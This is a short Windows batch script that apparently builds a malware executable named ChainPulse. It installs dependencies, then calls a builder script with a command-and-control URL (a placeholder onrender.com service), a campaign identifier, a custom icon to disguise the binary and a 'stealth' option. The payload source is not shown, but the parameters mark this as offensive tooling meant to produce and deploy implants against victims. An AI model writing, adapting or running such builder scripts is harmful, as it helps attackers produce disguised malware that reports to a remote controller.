@echo off
REM ChainPulse v8.0 — Build Windows .exe with icon
REM Run this on a Windows machine with Python 3.10+

set C2_URL=https://SEU-SERVICO.onrender.com
set CAMPAIGN=campanha-01
set NAME=ChainPulse

echo [*] Installing deps...
python -m pip install -r requirements.txt pyinstaller pillow

echo [*] Building ChainPulse.exe with icon...
python builder\generate.py --target windows --exe --name %NAME% --c2 %C2_URL% --campaign %CAMPAIGN% --icon builder\icon.ico --stealth standard -o .\output

echo.
echo [+] Done! Binary: .\output\windows\ChainPulse.exe
echo [+] Icon embedded: builder\icon.ico
pause
